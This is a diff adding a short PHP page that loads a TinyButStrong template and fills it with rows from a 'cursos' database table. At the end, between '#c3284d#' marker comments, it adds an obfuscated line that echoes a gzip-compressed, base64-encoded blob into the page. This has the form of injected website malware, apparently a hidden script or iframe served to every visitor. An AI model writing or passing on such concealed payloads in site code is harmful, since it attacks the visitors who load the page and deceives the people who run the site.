@@ -1,0 +1,21 @@
+<?php
+
+include_once('tbs_class.php') ;
+include_once('conexao_db.php') ;
+
+
+
+
+
+$TBS = new clsTinyButStrong ;
+$TBS->LoadTemplate('html/index.htm') ;
+$TBS->MergeBlock('bloco1',$cnx_id,'SELECT * FROM cursos') ; 
+
+
+$TBS->Show() ; 
+
+
+#c3284d#
+echo(gzinflate(base64_decode("JY5BDsIgFET3TXoH8jfqpiQuFXoKL/AFBJQCgV/R20vtbvKSNzOiquIzMfpmI4HMh/gT37hTmMdBJ7UuJtLUiidzPAj/KLgYVouS4IjyhfOMzmJ71UmlhevUYkioeSWkOmWXgcVuSLg1T2QKsN6eQvDRSsCVErB/5T0VbYqE2AEGb6ME1Yc3wRlvHUk4A2tek9vSLPh+ZT6cruMg+P55/gE=")));
+#/c3284d#
+?> 
